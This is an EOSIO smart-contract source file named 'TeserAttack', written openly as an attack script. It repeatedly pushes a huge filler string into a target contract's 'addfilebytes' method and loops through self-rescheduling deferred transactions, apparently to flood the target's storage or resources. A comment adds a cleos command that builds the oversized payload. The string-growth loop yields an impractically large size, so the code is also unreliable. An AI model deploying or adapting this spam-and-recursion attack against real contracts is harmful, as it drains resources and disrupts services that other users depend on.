//#include <eosiolib/permission.hpp>
#include <eosiolib/eosio.hpp>
#include <eosiolib/print.hpp>
#include <eosiolib/action.hpp>
//#include <eosiolib/transaction.h>
#include <eosiolib/contract.hpp>
#include <eosiolib/permission.hpp>
#include <eosiolib/action.h>
#include <eosio/serialize.hpp>
using namespace eosio;

class [[eosio::contract]] TeserAttack : public eosio::contract {
    public:
      using contract::contract;
        [[eosio::action]]
        void main(name client, uint64_t idx)
        {
            uint128_t initnum = 1;
            transaction out1{};
            transaction target{};

            int N = 1; // N division

            /////////////// TARGET CONTRACT METHOD ARGUMENT //////////
            // cleos push action provider addfilebytes "[8,`python -c 'print \"B\"*70480'`,70480]" -p client@active
            //////////////////////////////////////////////////////////////
            name targetContract = "provider"_n;
            name targetMethod = name("addfilebytes");
            std::string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
            for ( int i = 0; i < 10; i++)
            {
                A = A+A+A+A+A+A;
            }
            auto argu = std::make_tuple(
                    uint64_t(idx),
                    A, 
                    uint64_t(A.length())
                    );

            target.actions.emplace_back(permission_level{ client , "active"_n}, targetContract,  targetMethod, argu);
            target.send(idx, client, false);

            /////////////// Multi Dimension Call ///////////////////////
            for (int i =0; i < N ; i ++)
            {
                out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple( client, uint64_t(N * idx + (1-i)) ) );
                out1.send(N * idx + (1-i), client, false);
                out1.actions.pop_back();
                print ("[+] Seq Number :%d \n", N * idx + (1-i) );
            }
        };
        [[eosio::action]]
        void func(name client, uint64_t idx)
        {
            auto argu = std::make_tuple(client, uint64_t(idx));
            transaction out{};
            out.actions.emplace_back(permission_level{client, "active"_n}, _self, "main"_n, argu );
            out.send((idx), client, false);
            print("\t[#] FUNC: ", idx);
        };
};

EOSIO_DISPATCH( TeserAttack, (main)(func) )

